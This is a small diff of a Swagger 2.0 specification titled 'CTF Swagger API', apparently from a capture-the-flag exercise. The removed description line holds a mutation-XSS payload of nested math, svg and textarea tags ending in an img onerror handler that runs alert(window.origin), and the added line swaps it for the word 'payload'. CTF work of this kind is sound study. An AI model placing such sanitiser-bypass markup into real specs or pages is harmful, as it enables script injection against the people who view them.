@@ -2,7 +2,7 @@ swagger: "2.0"
 info:
   version: "1.0.0"
   title: "CTF Swagger API"
-  description: "<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>"
+  description: "payload"
 host: "https://api.mrgreen.com/"
 schemes:
   - "http"
